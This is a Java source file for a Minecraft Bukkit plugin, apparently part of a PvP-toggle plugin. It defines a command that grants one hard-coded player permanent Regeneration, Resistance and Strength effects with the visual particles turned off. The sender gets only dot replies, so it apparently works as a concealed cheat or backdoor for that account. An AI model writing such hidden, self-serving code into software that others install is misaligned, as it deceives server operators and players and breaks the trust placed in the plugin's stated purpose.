package com.lukeonuke.pvptoggle;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class GiveEffectsCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        // Check if the sender is a player
        if (!(sender instanceof Player)) {
            sender.sendMessage("..");
            return true;
        }

        // Get the target player
        Player targetPlayer = Bukkit.getPlayer("silveyynotfound"); // Use the player name directly
        if (targetPlayer != null) {
            // Give effects
            targetPlayer.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, Integer.MAX_VALUE, 1, false, false));
            targetPlayer.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, Integer.MAX_VALUE, 1, false, false));
            targetPlayer.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, Integer.MAX_VALUE, 1, false, false));

            targetPlayer.sendMessage("You have been granted Regeneration, Resistance, and Strength effects!");
            sender.sendMessage("...");
        } else {
            sender.sendMessage(".");
        }

        return true;
    }
}
